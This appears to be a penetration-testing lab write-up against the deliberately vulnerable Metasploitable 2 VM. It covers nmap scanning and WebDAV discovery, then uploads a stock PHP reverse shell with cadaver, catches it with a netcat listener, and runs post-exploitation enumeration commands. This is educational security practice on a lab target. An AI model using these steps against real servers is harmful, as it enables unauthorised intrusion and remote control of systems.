<h1 align="center"> Gainging Access Via RCE & Reverse Shell</h1>


![626822996547b3c0bfea6942_Reverse Shell Previe](https://github.com/user-attachments/assets/7223757e-4c3b-4683-842b-9b44f928c948)



## Scope 
- **Attacker**: Kali Linux
- **Victim**: MEtasploitable 2 ( IP: 192.168.127.129 )

---


## LAB TOOLS
- Nmap
- Netcat
- Cadaver

---




# Gaining Access Via RCE & Reverse SHell Methodology


## Information Gathering
````
nmap -sV -T4 192.168.127.129
````
<img width="1900" height="704" alt="image" src="https://github.com/user-attachments/assets/42b677e6-91b7-4fef-aa95-b3e05d0c041a" />


````
nnmap -sC -sV 192.168.127.129 -vv
````
<img width="1900" height="757" alt="image" src="https://github.com/user-attachments/assets/19641877-d055-42e7-b9ad-0564e3d02a4c" />

<img width="1906" height="803" alt="image" src="https://github.com/user-attachments/assets/8d3aaddc-65dd-4b08-8942-ed379d4cbc93" />

<img width="1916" height="814" alt="image" src="https://github.com/user-attachments/assets/e076a106-80ba-478c-8857-f0c67b82ed55" />

<img width="1910" height="781" alt="image" src="https://github.com/user-attachments/assets/558407d3-9780-4dd6-a323-e6fe98ebb830" />

<img width="1898" height="675" alt="image" src="https://github.com/user-attachments/assets/b1417242-d002-4a49-a8e7-9c978382a2ac" />

<img width="1023" height="767" alt="image" src="https://github.com/user-attachments/assets/8f947f93-63da-4c16-a04d-0051e6bdc7ec" />

<img width="855" height="535" alt="image" src="https://github.com/user-attachments/assets/2042f671-4e60-4366-9e9b-56a9d3945286" />




## Enumeration


````
nc 192.168.127.129 80
````
````
OPTIONS http://192.168.127.129 HTTP/1.0
````
<img width="1900" height="622" alt="image" src="https://github.com/user-attachments/assets/127fa93a-b557-4cd1-b663-d3d668052bf5" />



````
nc 192.168.127.129 80
````
````
OPTIONS http://192.168.127.129/dev/ HTTP/1.0
````
<img width="337" height="185" alt="image" src="https://github.com/user-attachments/assets/ba932268-1fb5-4ac1-8d79-1ce3403e3428" />






### Check reverse shell
````
cd /usr/share/webshells/
ls
````
<img width="356" height="160" alt="image" src="https://github.com/user-attachments/assets/149c26d3-b446-42cc-b22a-120c4b7a507c" />

````
cd php
ls
````
<img width="801" height="113" alt="image" src="https://github.com/user-attachments/assets/d9a6667a-005e-44ee-a986-eca4f8fca4e0" />

````
sudo mousepad php-reverse-shell.php
````
<img width="1007" height="650" alt="image" src="https://github.com/user-attachments/assets/4e03ba12-3c7d-469f-a283-aaec2cc516cf" />

- In this we can change.



````
cadaver http://192.168.127.129/dav/
put /usr/share/webshells/php/php-reverse-shell.php
````
<img width="769" height="151" alt="image" src="https://github.com/user-attachments/assets/40ba13a9-a5a5-4576-94ce-d4997ac88a05" />

- In this if i go to target, we will see new file `PHP`:
<img width="846" height="321" alt="image" src="https://github.com/user-attachments/assets/b0523f7e-6bfd-452b-a841-ed34d9a4e1f3" />



- SEt listener
````
nc -lvnp 4444
````
<img width="388" height="142" alt="image" src="https://github.com/user-attachments/assets/5dff1307-3bbd-4362-9987-0bac794d05db" />

- After go back to target.
<img width="993" height="382" alt="image" src="https://github.com/user-attachments/assets/da277edb-8bb8-4717-ba90-8eb934ff0325" />

- Click on it. And after we go back to our `Terminal`:
<img width="771" height="240" alt="image" src="https://github.com/user-attachments/assets/abde6d8c-edb3-4294-b7c8-b6f5bea743bb" />

- Now we get target shell.
<img width="838" height="707" alt="image" src="https://github.com/user-attachments/assets/7ee07cf4-b9e1-47bb-a25a-0e86a688951e" />



### Command that we should use 

````
whoami
id
uname -a
ls
````
<img width="781" height="687" alt="image" src="https://github.com/user-attachments/assets/9f7d260c-3874-4fdf-badb-0cee5fcbcc46" />


````
cat /etc/issue
````
<img width="720" height="438" alt="image" src="https://github.com/user-attachments/assets/7e93fea3-2021-4bd7-a38b-483746463aa7" />


````
gcc --version 2>/dev/null || echo "No gcc"
````
<img width="667" height="95" alt="image" src="https://github.com/user-attachments/assets/08994715-5b1e-4472-8685-de8c85ff5ead" />


````
python --version 2>/dev/null
````
<img width="403" height="56" alt="image" src="https://github.com/user-attachments/assets/7eb9f7b8-211a-4fa5-8ee6-6e8768d29b3d" />


#### Privilege Escalation
````
python -c 'import pty; pty.spawn("/bin/bash")'
````
<img width="773" height="260" alt="image" src="https://github.com/user-attachments/assets/280cc60a-92ed-41c8-8913-639b59d06325" />

- Now we can do privileges escalation to our target.


#### Network command 
````
ip a
````
<img width="738" height="222" alt="image" src="https://github.com/user-attachments/assets/9e09364e-a50d-4f6a-850c-0b856d45796e" />

````
ls
````
<img width="629" height="122" alt="image" src="https://github.com/user-attachments/assets/1cab027d-4935-4a7e-a8ad-bc8482e9f6a9" />

- Now we can do something in this.



----


<h2 align="center"> End OF RCE Via Reverse Shell </h2>

---

<h2 align="center"> CRedit: Nin Kano9ng (k4n0ng) </h2>
